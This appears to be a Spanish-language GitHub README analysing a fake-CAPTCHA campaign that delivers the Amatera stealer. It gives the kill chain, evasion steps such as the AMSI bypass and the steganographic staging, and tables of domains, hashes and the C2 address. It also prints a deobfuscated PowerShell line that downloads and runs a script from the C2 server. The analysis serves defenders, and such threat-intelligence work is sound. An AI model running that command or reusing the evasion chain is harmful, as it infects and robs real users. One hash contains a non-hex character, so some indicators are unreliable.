# FakeCAPTCHA-Amatera-2026-

# 🚨 Fake CAPTCHA → Amatera Stealer (Enero 2026)

[![Stars](https://img.shields.io/github/stars/[tuusuario]/FakeCAPTCHA-Amatera-2026)](https://github.com/[tuusuario]/FakeCAPTCHA-Amatera-2026)
[![VT Detections](https://img.shields.io/badge/VT-13/72-red)](https://virustotal.com)

**Análisis completo** de la campaña Blackpoint SOC: Fake CAPTCHA → App-V LOLBIN → Google Calendar C2 → PNG Steganography → Amatera Stealer.

## 🎯 Kill Chain

```mermaid
graph TD
    A["Fake CAPTCHA<br/>Win+R Base64"] --> B["wscript.exe<br/>SyncAppvPublishingServer.vbs"]
    B --> C["Clipboard gate<br/>ALLUSERSPROFILE_X"]
    C --> D["Google Calendar<br/>.ics SUMMARY:povvv"]
    D --> E["PNG Stego 3xCDN<br/>LSB+XOR"]
    E --> F["AMSI bypass<br/>NtAllocateVirtualMemory"]
    F --> G["Amatera Stealer<br/>212.34.138.4"]
    
    style A fill:#ffebee
    style B fill:#fff3e0
    style G fill:#f44336

```

Resumen Ejecutivo
Campaña MaaS enterprise-grade identificada por Blackpoint SOC. 4 variantes activas (boom/nim5/CDN/bdedc647) comparten cadena común: Fake CAPTCHA → App-V LOLBIN → execution gates → Google Calendar C2 → PNG steganography → Amatera Stealer.



Kill Chain

1. FAKE CAPTCHA → Win+R comando Base64 Unicode
   └── new-alias iex Invoke-Expression → herf54/nim5/sample.bin
   
2. wscript.exe → SyncAppvPublishingServer.vbs (App-V LOLBIN)
   └── SOLO Enterprise/Education Win10/11
   
3. CLIPBOARD GATE + anti-análisis
   └── ALLUSERSPROFILE_X validation
   └── RAM check (>2GB), archivo fantasma C:\NonExistentPath\781.cfg
   
4. GOOGLE CALENDAR C2 (.ics SUMMARY:povvv)
   └── sec-t2.fainerkern.ru → MD5 victim subdomain → svc-int-api-identity-token-issuer-v2-mn.in.net
   
5. PNG STEGANOGRAPHY (3x CDN redundancia)
   └── gcdnb.pbrd.co | iili.io | s6.imgcdn.dev
   └── LSB extraction → XOR(s8YUKQ0CqUd6HNwGSRDZ%Qpux1N9MKHh) → GZip PS1
   
6. AMSI BYPASS + shellcode staging
   └── XOR key: AMSI_RESULT_NOT_DETECTED
   └── NtAllocateVirtualMemory → Amatera PE
   
7. C2 212.34.138.4 (SSPI + WoW64 syscalls)
   └── Host: cdn.extremevideos.com
---------
README.md - IOCs Visual + 3 Fases (Listo para GitHub)
text
## 🎯 IOCs MAPEADOS A FASES

### 1️⃣ FAKE CAPTCHA → App-V LOLBIN
cdn.jsdelivr.net → herf54 (b61fe68f0b1bef12eed8a34769120d77579af9d3c529ac48dfe82a08eefa001b)
Win+R → wscript.exe → SyncAppvPublishingServer.vbs
<img width="1208" height="753" alt="image" src="https://github.com/user-attachments/assets/c62bc488-fabf-4331-a3fb-46e5fd501150" />


### 2️⃣ CLIPBOARD GATE → Google Calendar C2  
sec-t2.fainerkern.ru → basic.ics (64d723ead9b43a049f9c8e23c8d4ec09ffabeac2d9b079c863c89a4aab7c9a45)
svc-int-api-identity-token-issuer-v2-mn.in.net → 9c35e9f637365706l00acaa050a4510adfcb47e7052b870c6d07f6d4464ac2d2
SUMMARY:povvv → 8f0b3df4e0aadf775c9bc934f53b2d17

text

<img src="screenshots/2_calendar_basicics.png" width="100%" />

### 3️⃣ PNG STEGANOGRAPHY → Amatera
CDNs: gcdnb.pbrd.co | iili.io | s6.imgcdn.dev
PNG: qhs9hr5gPqez.png (bbfc4b48676aa78b5f18b50e733837a94df744da329fe5b1b7ba6920d9e02dc3)
XOR: s8YUKQ0CqUd6HNwGSRDZ%Qpux1N9MKHh → 5339d1169e2187a482fcbc86ea94e9799bb9dbaf264622595ee6e94b54b51778
Shellcode: 18dad9cb91fb97a817e00fa0cd1cb9ab59f672b8ddab29f72708787f19bf6aa1
C2: 212.34.138.4 (Host: cdn.extremevideos.com)

text

<img src="screenshots/3_png_c2.png" width="100%" />

## 📋 IOCs COMPLETOS

| Type | Indicator | Hash/Notes |
|------|-----------|------------|
| 🌐 Domain | cdn.jsdelivr.net | Fake CAPTCHA CDN |
| 🌐 Domain | sec-t2.fainerkern.ru | Calendar execution gate |
| 🌐 Domain | svc-int-api-identity-token-issuer-v2-mn.in.net | Victim MD5 subdomains |
| 🌐 Domain | gcdnb.pbrd.co, iili.io, s6.imgcdn.dev | PNG stego CDNs |
| 💾 File | herf54 | b61fe68f0b1bef12eed8a34769120d77579af9d3c529ac48dfe82a08eefa001b |
| 💾 File | basic.ics | 64d723ead9b43a049f9c8e23c8d4ec09ffabeac2d9b079c863c89a4aab7c9a45 |
| 💾 PNG | qhs9hr5gPqez.png, fOa2bcJ.png, YzkCM2.png | bbfc4b48676aa78b5f18b50e733837a94df744da329fe5b1b7ba6920d9e02dc3 |
| 🚀 C2 | 212.34.138.4 | Amatera Stealer |
📸 Screenshots Específicos por Fase
1_captcha_herf54.png
text
VT: b61fe68f0b1bef12eed8a34769120d77579af9d3c529ac48dfe82a08eefa001b
- Relations graph con cdn.jsdelivr.net
- Process tree: explorer.exe → wscript.exe
- Strings: "SyncAppvPublishingServer.vbs"
2_calendar_basicics.png
text
VT: 64d723ead9b43a049f9c8e23c8d4ec09ffabeac2d9b079c863c89a4aab7c9a45
- File content: "SUMMARY:povvv"
- "sec-t2.fainerkern.ru" domain
- Relations → 9c35e9f637365706l00acaa050a4510adfcb47e7052b870c6d07f6d4464ac2d2
3_png_c2.png
text
VT: bbfc4b48676aa78b5f18b50e733837a94df744da329fe5b1b7ba6920d9e02dc3
OR 18dad9cb91fb97a817e00fa0cd1cb9ab59f672b8ddab29f72708787f19bf6aa1
- PNG relations chain completa
- "212.34.138.4" + "cdn.extremevideos.com"
- Strings: "q0A5@z" "hcUdFm" desde cdn.jsdelivr.net_sample.bin
🎯 Carpetas Final
text
screenshots/
├── 1_captcha_herf54.png
├── 2_calendar_basicics.png
└── 3_png_c2.png

-----
variantes: <img width="995" height="602" alt="image" src="https://github.com/user-attachments/assets/e629e96e-927d-42fe-90d6-3a312f404c48" />

En nim5 en content si desofuscamos hayamos: 
`$ErrorActionPreference = 'SilentlyContinue'; 
iex (New-Object Net.WebClient).DownloadString('http://212[.]34.138.4:8080/amatera.ps1'`


### **Hashes Principales Completos**
| **Variante** | **SHA256** |
|--------------|------------|
| **boom** | `c64529646839be71fdfa7261cd2f3b5e6fac929d53341dd134793a7194b2d433` |
| **nim5** | `25b77cacec19302d81a44fdeccf1fed9ff117aee3d7ca262a46d2c90f9aca42b` |
| **CDN sample.bin** | `7537cb0e719d9d0609eee7910542e877eae032707cbc15cfbd4c758f0040861f` |
| **bdedc647_b12.txt** | `0bcad4e8bfeebdb7b504c500db037c8930b3d69c53940002d3da395374c6f671` |
| **herf54 loader** | `b61fe68f0b1bef12eed8a34769120d77579af9d3c529ac48dfe82a08eefa001b` |
| **Google Calendar .ics** | `64d723ead9b43a049f9c8e23c8d4ec09ffabeac2d9b079c863c89a4aab7c9a45` |
| **PNG stego container** | `bbfc4b48676aa78b5f18b50e733837a94df744da329fe5b1b7ba6920d9e02dc3` |
| **Amatera PE shellcode** | `18dad9cb91fb97a817e00fa0cd1cb9ab59f672b8ddab29f72708787f19bf6aa1` |

**C2 final**: `212.34.138.4` (Host spoofing: `cdn.extremevideos.com`)

---
